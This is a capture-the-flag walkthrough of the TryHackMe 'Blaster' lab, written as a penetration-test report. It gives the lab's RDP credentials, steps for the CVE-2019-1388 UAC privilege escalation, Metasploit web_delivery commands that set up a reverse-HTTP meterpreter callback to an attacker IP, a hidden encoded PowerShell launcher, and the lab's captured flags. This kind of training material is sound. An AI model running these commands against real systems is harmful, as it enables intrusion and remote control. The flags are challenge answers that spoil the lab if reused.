# Walktrough : TryHackMe - Blaster
## Executive Summary
This report documents the end-to-end exploitation, privilege escalation, and persistence phases completed on the host RETROWEB (```10.48.191.50```). The assessment successfully achieved full administrative compromise (```NT AUTHORITY\SYSTEM```) and retrieved both user and root target flags.

## 1. Initial Access & User Reconnaissance
- Target System: ```10.48.191.50``` (RETROWEB)
- Authentication Method: Remote Desktop Protocol (RDP)
- Credentials: ```wade``` : ```parzival```

Execution Steps:

1. Initiated RDP session from Kali Linux (```192.168.135.130```):
```bash
xfreerdp /u:wade /p:parzival /v:10.48.191.50
```
2. Accessed desktop environment and extracted initial user flag:
      - Location: ```C:\Users\Wade\Desktop\user.txt```
      - User Flag: ```THM{HACK_PLAYER_ONE}```

---

## 2. Privilege Escalation (CVE-2019-1388)
- Vulnerability: Windows User Account Control (UAC) Certificate Dialog Privilege Escalation
- Target Binary: ```C:\Users\Wade\Desktop\hhupd.exe```

Execution Steps:

1. Executed ```hhupd.exe``` via Run as administrator.
2. Selected Show information about the publisher's certificate within the UAC prompt.
3. Clicked the VeriSign Commercial Software Publishers CA hyperlink, triggering Internet Explorer under ```SYSTEM``` context.
4. Used Internet Explorer's file browser (```File -> Save as...```) to navigate to ```C:\Windows\System32\*.*```.
5. Executed ```cmd.exe``` directly from the file dialog to spawn an elevated shell.
6. Verified execution context: ```nt authority\system```.

---

## 3. Persistence & C2 Channel (Metasploit Web Delivery)

- Attacker IP: ```192.168.135.130```
- Delivery Module: ```exploit/multi/script/web_delivery```
- Payload: ```windows/meterpreter/reverse_http```

Configuration & Staging:
```bash
use exploit/multi/script/web_delivery
set LHOST 192.168.135.130
set target 2
set payload windows/meterpreter/reverse_http
set SRVPORT 1234
run
```
Payload Execution:
- Executed generated Base64 PowerShell payload inside the elevated ```cmd.exe``` prompt on target:
```bash
powershell.exe -nop -w hidden -e <BASE64_PAYLOAD>
```
- Handled incoming reverse HTTP connection, delivering AMSI bypass and payload staging to establish interactive session.

---

## 4. Post-Exploitation & Evidence Capture

- Active Session: Session 1 (```meterpreter x86/windows```) as ```NT AUTHORITY\SYSTEM```.
- Root Flag Retrieval:
```bash
meterpreter > sessions 1
meterpreter > ls C:\Users\Administrator\Desktop
meterpreter > cat C:\Users\Administrator\Desktop\root.txt
```
- Root Flag: ```THM{COIN_OPERATED_EXPLOITATION}```
